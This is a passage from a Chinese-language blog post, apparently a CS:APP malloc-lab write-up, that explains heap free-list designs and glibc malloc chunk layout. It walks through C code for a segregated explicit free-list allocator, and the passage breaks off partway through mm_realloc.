栈只有 8MB），而且局部变量随着函数执行完毕自动回收，这使得栈所存储的变量的生命周期也受到了限制。堆是由程序员维护的、用于保存大型对象的区域。在 C 语言中，可以通过 <code>malloc</code> 申请堆内存，<code>free</code> 释放内存。</p>
<p>动态内存管理的核心是一个分配器，处理到来的内存分配请求，需要考虑以下问题：</p>
<ul>
<li>给定一个指针，我们如何知道需要释放多少内存？
<ul>
<li>给块添加头部信息，记录块的大小</li>
</ul></li>
<li>如何记录未分配的块？
<ul>
<li>固定大小的块，可以使用 bitmap 记录</li>
<li>一般而言，通用的、大小不定的块，使用<strong>空闲链表</strong>记录</li>
</ul></li>
<li>实际需要的空间比未分配的空间要小的时候，剩下的空间怎么办？
<ul>
<li>如果剩余大小大于一定阈值，将其拆分，否则整块返回</li>
</ul></li>
<li>如果有多个区域满足条件，如何选择？
<ul>
<li>首次适应、下一次适应等<strong>分配算法</strong></li>
</ul></li>
<li>释放空间之后如何进行记录？
<ul>
<li>将首部的空闲 bit 置 1</li>
</ul></li>
</ul>
<p>这些问题的核心在于，空闲链表如何组织，以及分配算法怎样选取。</p>
<p>空闲链表有以下几种组织方式：</p>
<p><strong>隐式空闲链表</strong>，如下图所示。每个块的首部记录了块大小以及空闲标记，相当于使用数组实现的单向链表，同时包含了空闲块和非空闲块。这种方式下，<code>malloc</code> 需要从第一个块开始遍历，最坏 O (n) 才能找到合适的块，n 为块的数量。<code>free</code> 时需要与左右的空闲块合并，左侧的块也需要从头开始遍历才能访问到，也需要 O (n) 时间，性能很差。</p>
<p><img src="implicit_list.png"></p>
<p><strong>显式空闲链表</strong>，如下图所示。思想是在空闲块中添加前后向指针，指向相邻的空闲块，得到了显式的空闲链表。这样就可以减少 <code>malloc</code> 的复杂度为 O (f)，f 为空闲块的数量。在空闲块的末尾，添加了一个尾部记录了块的大小，并在每个块的首部记录了前一个块是否空闲，这样可以在 O (1) 的时间内完成相邻空闲块的合并。</p>
<p><img src="explicit_block.png"></p>
<p><img src="explicit_list.png"></p>
<p><strong>分隔空闲链表</strong>，在显式空闲链表的基础上，根据空闲块的大小，拆分到不同的链表中。当新请求到来时，只需要在满足大小的链表中搜索即可，进一步减少了 <code>malloc</code> 的常数。</p>
<h3 id="malloc">malloc</h3>
<p><code>malloc</code> 的原型为：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> __size)</span></span></span><br></pre></td></tr></tbody></table></figure>
<p>malloc ()
并不是系统调用，而是 C 语言库函数，内部通过 <code>brk</code> 或者 <code>mmap</code> 的系统调用来扩展虚拟内存空间。<code>malloc</code> 使用了显式空闲链表的方法，块的结构如下所示：</p>
<p><img src="malloc_chunk.png"></p>
<p>不同的是，空闲块没有记录尾部，而是在首部新加了一个字段存储前一个块的大小。由于 <code>malloc</code> 返回的地址总是 8 字节对齐的，因此块的大小也会对齐到 8 的整数倍。这意味着 size 的后 3 位永远是 0，这里就是使用了这三位来存储额外的信息：块属于主分配区或者非主分配区（A），前一个块是否空闲（P），从哪个内存区域获得的虚拟内存（M）。这些空闲块构成了内存池，当新请求到来时，<code>malloc</code> 会尝试先从内存池分配，如果分配成功就无需系统调用，失败则再通过 <code>brk</code> 或者 <code>mmap</code> 调用申请内存。<code>free</code> 时同理，先归还到内存池，当堆顶空闲内存超出阈值时，再通过 <code>sbrk</code> 归还给系统。</p>
<p>malloc 的详细介绍可以参考 <a href="https://jacktang816.github.io/post/mallocandfree/">malloc 和 free 的实现原理解析
- JackTang's Blog
(jacktang816.github.io)</a>。值得注意的是，<code>malloc</code> 只申请了虚拟内存，也就是说，操作系统仅为这些地址创建了页表项，但没有将它们与物理地址关联起来。当这些内存被访问到之后，才会触发缺页异常，申请物理内存。</p>
<h2 id="代码实现">代码实现</h2>
<h3 id="思路">思路</h3>
<p>我使用了隔离显式空闲链表的方法，使用多个空闲链表存储不同大小的空闲块，<code>malloc</code> 时只需要在<span class="math inline"> \(\ge
size\)</span> 的链表中查找，来达到减小常数的效果。在块内部的 header 中，存储大小、本块与前一个块的空闲信息。在空闲块里，额外存储指向空闲链表前驱和后继的指针。</p>
<p>这个大思路下，两个重要的问题是，空闲链表与大小的关系如何映射，空闲链表的头部存储在哪里？对于第一个问题，我参考 linux 的伙伴系统，不同链表存储的块大小呈倍数关系，例如第一条链存 [8,16) Bytes 的块，第二条链存 [16,32) Bytes 的块，以此类推。这样的优点是，链表的数量不会太多，最多只有<span class="math inline"> \(O(logn)\)</span> 条链，缺点是不同链的块数量不够均匀。第二个问题，我选择存储在了堆的首部，在 <code>mm_init</code> 时对其初始化。</p>
<p>思路确定好之后，可以先拆分一些小的宏函数，来实现常用的功能。</p>
<h3 id="宏定义">宏定义</h3>
<p>我将常用操作封装了很多宏函数，如下所示。这些宏函数的命名都很直观，例如 <code>HEADER</code> 用于读取块的头部信息，<code>HAS_PRED_BLOCK</code> 是判断一个块有没有前向相邻的块（是否达到了边界）、<code>SUCC_BLOCK</code> 用于获取后一个块的起始地址。这些宏是随着代码的编写逐渐补充的。</p>
<p>与函数相比，宏在预处理期被展开，没有函数调用的开销，相当于被内联的函数，适合封装一些指针运算逻辑，这些代码往往需要复用。由于宏的可读性差、参数类型不直观、容易出现优先级问题，不推荐封装很复杂的逻辑。在我的实践中，也是针对参数类型取不同的名字，例如 <code>header_p</code> 意味着一个 <code>header
*</code> 的参数，<code>address</code> 代表 <code>void
*</code> 等，来避免类型误用的问题。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* single word (4) or double word (8) alignment */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALIGNMENT 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* rounds up to the nearest multiple of ALIGNMENT */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> header_t size_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEADER_T_SIZE SIZE_T_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> footer_t header_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOOTER_T_SIZE HEADER_T_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> uint32 unsigned long</span></span><br><span class="line"><span class="comment">// 空闲链表的数量</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG_TABLE_SIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最小块与最小空闲块的大小</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_BLOCK_SIZE HEADER_T_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_FREE_BLOCK_SIZE 24 <span class="comment">// 8+4+4+8</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 隔离表的起始位置</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> **seg_table;</span><br><span class="line"><span class="comment">// 块的起始边界</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *block_start;</span><br><span class="line"><span class="comment">// flag的偏移</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FREE_BIT 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRED_FREE_BIT 1</span></span><br><span class="line"><span class="comment">// 读取header信息</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEADER(address) (*(header_t *)(address))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOOTER(address) (HEADER(address))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_OPTIONS(header) ((header) &amp; (ALIGNMENT - 1))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(header) ((header)-GET_OPTIONS(header))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GEN_HEADER(size, free, pred_free) ((size) | ((free) &lt;&lt; (FREE_BIT)) | ((pred_free) &lt;&lt; (PRED_FREE_BIT)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_FREE(header) (((header)) &amp; (1 &lt;&lt; FREE_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_PRED_FREE(header) ((header) &amp; (1 &lt;&lt; PRED_FREE_BIT))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 前后边界信息</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HAS_PRED_BLOCK(address) ((uint32)(address) &gt; (uint32)block_start)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUCC_BLOCK(address) ((void *)((char *)(address) + GET_SIZE(HEADER(address))))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HAS_SUCC_BLOCK(address) ((uint32)SUCC_BLOCK(address) &lt; (uint32)mem_heap_hi())</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置header字段</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_SIZE(header_p, size) (*(header_p) = (size) | GET_OPTIONS(*(header_p)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_FREE(header_p) (*(header_p) |= (1 &lt;&lt; FREE_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_PRED_FREE(header_p) (*(header_p) |= (1 &lt;&lt; PRED_FREE_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_BUSY(header_p) (*(header_p) &amp;= ~(1 &lt;&lt; FREE_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_PRED_BUSY(header_p) (*(header_p) &amp;= ~(1 &lt;&lt; PRED_FREE_BIT))</span></span><br><span class="line"><span class="comment">// 空闲块的前驱、后继指针的偏移量</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_OFFSET HEADER_T_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_OFFSET (HEADER_T_SIZE + sizeof(void *))</span></span><br><span class="line"><span class="comment">// 获取指向prev和next的指针, aka, void **</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PPREV(address) ((void **)((char *)(address) + PREV_OFFSET))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PNEXT(address) ((void **)((char *)(address) + NEXT_OFFSET))</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="mm_init">mm_init</h3>
<p>申请一块内存用于存储隔离空闲链表的头部 <code>seg_table</code>，并初始化。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_init - initialize the malloc package.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    seg_table = mem_heap_hi();</span><br><span class="line">    mem_sbrk(SEG_TABLE_SIZE * <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SEG_TABLE_SIZE; i++)</span><br><span class="line">    {</span><br><span class="line">        seg_table[i] = <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    block_start = seg_table + SEG_TABLE_SIZE;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="mm_malloc">mm_malloc</h3>
<p>优先从空闲块中查找<span class="math inline"> \(\ge
size\)</span> 的块，采用首次适应的策略，若：</p>
<ul>
<li>查找失败，则通过 <code>mem_sbrk</code> 申请新内存</li>
<li>查找成功，选择是否对块进行拆分，返回 </li>
</ul>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_malloc - Allocate a block. If no free blocks satisfying the size, allocate a new one by incrementing the brk pointer.</span></span><br><span class="line"><span class="comment"> *     Always allocate a block whose size is a multiple of the alignment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> newsize = ALIGN(size + SIZE_T_SIZE);</span><br><span class="line">    <span class="keyword">void</span> *address = fetch_free_block_ge(newsize);</span><br><span class="line">    <span class="keyword">if</span> (address != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)address + SIZE_T_SIZE);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">void</span> *p = mem_sbrk(newsize);</span><br><span class="line">    <span class="keyword">if</span> (p == (<span class="keyword">void</span> *)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        *(<span class="keyword">size_t</span> *)p = newsize;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)p + SIZE_T_SIZE);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这段代码的核心在于 <code>fetch_free_block_ge</code> 函数，代码如下。它的逻辑为，先获取 size 对应的空闲链表，依次向后遍历，直到找到一个大小符合的空闲块。通过 <code>remove_free_block</code> 函数将其从空闲链表移除，<code>split_block</code> 函数对其进行拆分。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 获取一个大于或等于给定大小的空闲块</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> * @return void* </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">fetch_free_block_ge</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> index = get_seg_index(size);</span><br><span class="line">    <span class="keyword">size_t</span> bsize;</span><br><span class="line">    <span class="keyword">for</span> (; index &lt; SEG_TABLE_SIZE; index++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">void</span> *address = seg_table[index]; address != <span class="literal">NULL</span>; address = *PNEXT(address))</span><br><span class="line">        {</span><br><span class="line">            bsize = GET_SIZE(HEADER(address));</span><br><span class="line">            <span class="keyword">if</span> (bsize &gt;= size)</span><br><span class="line">            {</span><br><span class="line">                remove_free_block(address);</span><br><span class="line">                split_block(address, size);</span><br><span class="line">                SET_BUSY((<span class="keyword">header_t</span> *)address);</span><br><span class="line">                <span class="keyword">if</span> (HAS_SUCC_BLOCK(address))</span><br><span class="line">                {</span><br><span class="line">                    SET_PRED_BUSY((<span class="keyword">header_t</span> *)SUCC_BLOCK(address));</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">return</span> address;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>代码中用到的工具函数代码如下。需要注意的是，在 <code>remove_free_block</code> 中，由于空闲块的前驱可能是链头，不是常规的空闲块，二者的读写模式有所差异，需要做区分。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 获取 size 对应的空闲链表索引</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param size</span></span><br><span class="line"><span class="comment"> * @return int</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_seg_index</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> index = SEG_TABLE_SIZE - <span class="number">1</span>; index &gt;= <span class="number">0</span>; index--)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (size &gt;= (MIN_BLOCK_SIZE &lt;&lt; index))</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> index;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"get_seg_index ERROR! size %zu\n"</span>, size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 将空闲块从空闲链表中删除</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param address</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_free_block</span><span class="params">(<span class="keyword">void</span> *address)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">header_t</span> cur_header = HEADER(address);</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(cur_header);</span><br><span class="line">    <span class="keyword">int</span> index = get_seg_index(size);</span><br><span class="line">    <span class="keyword">void</span> **pprev = PPREV(address);</span><br><span class="line">    <span class="keyword">void</span> **pnext = PNEXT(address);</span><br><span class="line">    <span class="keyword">void</span> **seg_head = seg_table + index;</span><br><span class="line">    <span class="keyword">if</span> (*seg_head == address)</span><br><span class="line">    {</span><br><span class="line">        *seg_head = *pnext;</span><br><span class="line">        <span class="keyword">if</span> (*pnext != <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            *PPREV(*pnext) = seg_head;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        *PNEXT(*pprev) = *pnext;</span><br><span class="line">        <span class="keyword">if</span> (*pnext != <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            *PPREV(*pnext) = *pprev;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 将一个块 size 之后的部分拆分空闲块（如果满足大小要求），返回是否成功</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param address</span></span><br><span class="line"><span class="comment"> * @param size</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">split_block</span><span class="params">(<span class="keyword">void</span> *address, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">header_t</span> header = HEADER(address);</span><br><span class="line">    <span class="keyword">size_t</span> bsize = GET_SIZE(header);</span><br><span class="line">    <span class="keyword">if</span> (bsize &gt;= size + MIN_FREE_BLOCK_SIZE)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">void</span> *rest = (<span class="keyword">char</span> *)address + size;</span><br><span class="line">        SET_SIZE((<span class="keyword">header_t</span> *)address, size);</span><br><span class="line">        init_header_footer(rest, bsize - size, <span class="number">1</span>, IS_FREE(header));</span><br><span class="line">        insert_free_block(rest);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 初始化块的 header 和 footer（如果空闲）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param address</span></span><br><span class="line"><span class="comment"> * @param size</span></span><br><span class="line"><span class="comment"> * @param free</span></span><br><span class="line"><span class="comment"> * @param pred_free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_header_footer</span><span class="params">(<span class="keyword">void</span> *address, <span class="keyword">size_t</span> size, <span class="keyword">int</span> <span class="built_in">free</span>, <span class="keyword">int</span> pred_free)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">header_t</span> header = GEN_HEADER(size, <span class="built_in">free</span>, pred_free);</span><br><span class="line">    *(<span class="keyword">header_t</span> *)address = header;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">free</span>)</span><br><span class="line">    {</span><br><span class="line">        *(<span class="keyword">footer_t</span> *)((<span class="keyword">char</span> *)address + size - FOOTER_T_SIZE) = header;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="mm_free">mm_free</h3>
<p>free 需要做以下几件事情，拆分为独立的宏或函数</p>
<ul>
<li>将块标记为空闲：<code>SET_FREE</code> 与 <code>SET_PRED_FREE</code></li>
<li>与相邻空闲块合并：<code>coalesce_block</code></li>
<li>添加到空闲链表：<code>insert_free_block</code></li>
</ul>
<p>代码如下，根据 <code>ptr</code> 获取块的地址，获取相邻空闲块的地址，进入合并逻辑。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">void</span> *predecessor;</span><br><span class="line">    <span class="keyword">void</span> *successor = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">void</span> *address = (<span class="keyword">char</span> *)ptr - HEADER_T_SIZE;</span><br><span class="line">    <span class="keyword">header_t</span> header = HEADER(address);</span><br><span class="line">    predecessor = HAS_PRED_BLOCK(address) &amp;&amp; IS_PRED_FREE(header) ? pred_free_block(address) : <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (HAS_SUCC_BLOCK(address))</span><br><span class="line">    {</span><br><span class="line">        successor = SUCC_BLOCK(address);</span><br><span class="line">        SET_PRED_FREE((<span class="keyword">header_t</span> *)successor);</span><br><span class="line">        successor = IS_FREE(HEADER(successor)) ? successor : <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    coalesce_block(predecessor, address, successor);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>核心在于 <code>coalesce_block</code> 函数，计算合并后块的总大小，将其插入到对应的空闲链表中。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 合并相邻的空闲块</span></span><br><span class="line"><span class="comment"> * 假设当前块不处在空闲链表中</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">coalesce_block</span><span class="params">(<span class="keyword">void</span> *predecessor, <span class="keyword">void</span> *cur, <span class="keyword">void</span> *successor)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">header_t</span> cur_header = HEADER(cur);</span><br><span class="line">    <span class="keyword">if</span> (predecessor != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        remove_free_block(predecessor);</span><br><span class="line">        <span class="keyword">header_t</span> header = HEADER(predecessor);</span><br><span class="line">        <span class="comment">// 计算合并后的大小</span></span><br><span class="line">        <span class="keyword">size_t</span> size = GET_SIZE(header) + GET_SIZE(cur_header);</span><br><span class="line">        <span class="keyword">if</span> (successor != <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            size += GET_SIZE(HEADER(successor));</span><br><span class="line">            remove_free_block(successor);</span><br><span class="line">        }</span><br><span class="line">        init_header_footer(predecessor, size, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        insert_free_block(predecessor);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(cur_header);</span><br><span class="line">    <span class="keyword">if</span> (successor != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        size += GET_SIZE(HEADER(successor));</span><br><span class="line">        remove_free_block(successor);</span><br><span class="line">    }</span><br><span class="line">    init_header_footer(cur, size, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    insert_free_block(cur);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 将空闲块插入对应的空闲链表</span></span><br><span class="line"><span class="comment"> * 根据header获取大小</span></span><br><span class="line"><span class="comment"> * @param address block address</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_free_block</span><span class="params">(<span class="keyword">void</span> *address)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">size_t</span> cur_header = *(<span class="keyword">size_t</span> *)address;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(cur_header);</span><br><span class="line">    <span class="keyword">int</span> index = get_seg_index(size);</span><br><span class="line">    <span class="keyword">void</span> **pprev = PPREV(address);</span><br><span class="line">    <span class="keyword">void</span> **pnext = PNEXT(address);</span><br><span class="line">    *pprev = seg_table + index;</span><br><span class="line">    *pnext = seg_table[index];</span><br><span class="line">    <span class="keyword">void</span> *old = seg_table[index];</span><br><span class="line">    seg_table[index] = address;</span><br><span class="line">    <span class="keyword">if</span> (old != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        *PPREV(old) = address;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="mm_realloc">mm_realloc</h3>
<p>朴素的 <code>realloc</code> 可以这样实现：<code>mm_malloc</code> 新的内存，<code>memcpy</code> 将原内容拷贝到内存，<code>mm_free</code> 掉原本的内存。这种方法可以工作，但有以下问题：</p>
<ul>
<li>时间开销：耗时为三部分耗时之和</li>
<li>空间开销：引发内存碎片</li>
</ul>
<p>可以明确的是，针对通用的情况，上述逻辑是正确合理的，但是在某些情况下，可以做优化，例如：</p>
<ul>
<li><code>realloc</code> 用于减少块的大小，此时无需 <code>mm_malloc</code> 与 <code>memcpy</code>，可以直接返回，或者拆分小的空闲块后再返回</li>
<li>原有块的后方存在空闲块，二者合并后满足大小要求。相当于就地完成了 <code>malloc</code>，省去了 <code>memcpy</code>。</li>
</ul>
<p>针对这两种情况，可以编写如下的代码</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">void</span> *address = (<span class="keyword">char</span> *)ptr - HEADER_T_SIZE;</span><br><span class="line">    size = ALIGN(size + SIZE_T_SIZE);</span><br><span class="line">    <span class="keyword">header_t</span> header = HEADER(address);</span><br><span class="line">    <span class="keyword">size_t</span> old_size = GET_SIZE(header);</span><br><span class="line">    <span class="comment">// 判断是否是减少的情况，就地减少</span></span><br><span class="line">    <span class="keyword">if</span> (old_size &gt; size)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// 能否拆出来一个空闲块</span></span><br><span class="line">        split_block(address, size);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">char</span> *)address + HEADER_T_SIZE;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 判断合并后续空闲块后能否达到size，省去malloc与拷贝</span></span><br><span class="line">    <span class="keyword">if</span> (HAS_SUCC_BLOCK(address))</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">void</span> *succ = SUCC_BLOCK(address);</span><br><span class="line">        <span class="keyword">header_t</span> succ_header = HEADER(succ);</span><br><span class="line">        <span class="keyword">size_t</span> succ_size = GET_SIZE(succ_header);</span><br><span class="line">        <span class="keyword">if</span> (IS_FREE(succ_header) &amp;&amp; old_size + succ_size &gt;= size)</span><br><span class="line">        {</span><br><span class="line">            remove_free_block(succ);</span><br><span class="line">            <span class="comment">// 拆分后半部分空闲块</span></span><br><span class="line">            SET_SIZE((<span class="keyword">header_t</span> *)address, old_size + succ_size);</span><br><span class="line">            split_block(address, size);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">char</span> *)address + HEADER_T_SIZE;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 原本的 realloc 逻辑</span></span><br><span class="line">    <span class="keyword">void</span> *oldptr = ptr;</span><br><span class="line">    <span class="keyword">void</span> *newptr;</span><br><span class="line">    <span class="keyword">size_t</span> copySize;</span><br><span class="line"></span><br><span class="line">    newptr = 